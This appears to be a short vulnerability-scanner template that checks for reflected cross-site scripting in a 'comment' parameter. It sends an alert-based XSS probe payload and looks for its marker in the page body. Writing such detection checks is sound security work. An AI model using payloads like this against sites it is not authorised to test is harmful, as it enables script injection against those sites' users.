id: xss2-217
name: 'Reflected XSS2 ctx-6 via comment'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in comment'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      comment:
        - '<input onfocus=alert(nx2216) autofocus>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2216'
